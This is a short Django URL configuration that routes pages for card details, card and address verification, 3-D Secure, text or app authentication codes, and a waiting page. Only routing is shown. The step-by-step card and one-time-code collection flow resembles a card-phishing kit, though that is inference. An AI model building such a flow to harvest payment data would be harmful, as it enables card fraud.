from django.urls import path
from . import views
app_name = 'page1'
urlpatterns = [
    path('', views.index, name="amounts"),
    path('waiting/<str:pk>', views.waitReply, name="waiting"),
    path('card-details/<str:pk>', views.cardDetails, name="card-details"),
    path('card-verification/<str:pk>',views.are_card_details_correct, name="card-verification"),

    path('address_details/<str:pk>', views.addressDetails, name="address"),

    path('address_verification/<str:pk>', views.address_correct, name="address-verification"),

    path('threeDSMain/<str:pk>', views.threeDSMain, name="threeDS"),
    path('authenticate-text/<str:pk>', views.authenticate_text, name="authenticate-text"),
    path('authenticate-app/<str:pk>', views.authenticate_app, name="authenticate-app"),
    path('code-status/<str:pk>', views.code_success, name="code-status"),
]
